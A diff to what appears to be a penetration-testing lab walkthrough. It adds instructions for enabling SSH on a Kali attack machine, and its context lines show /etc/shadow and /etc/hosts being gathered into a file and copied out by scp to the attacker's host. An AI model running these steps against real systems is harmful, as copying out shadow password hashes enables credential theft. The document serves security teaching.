@@ -279,6 +279,13 @@ cat /etc/hosts >> users.txt   # Append /etc/hosts to the same file
 NOTE: The `>>` operator ensures that the contents of `/etc/shadow` and `/etc/hosts` are appended to `users.txt`. **If you use** `>`, **the file will be overwritten.**
 
 2. Next, use `SCP` to securely copy the `users.txt` file to your attack machine:
+
+   On your Kali machine, run the command `systemctl status ssh`.
+   If disabled and inactive, run the following two commands:
+   `sudo systemctl enable ssh`
+   `sudo systemctl start ssh`
+   To confirm the service has started, run
+   `systemctl status ssh`
    
 ```bash
 scp users.txt kali@<your_ip_address>:.
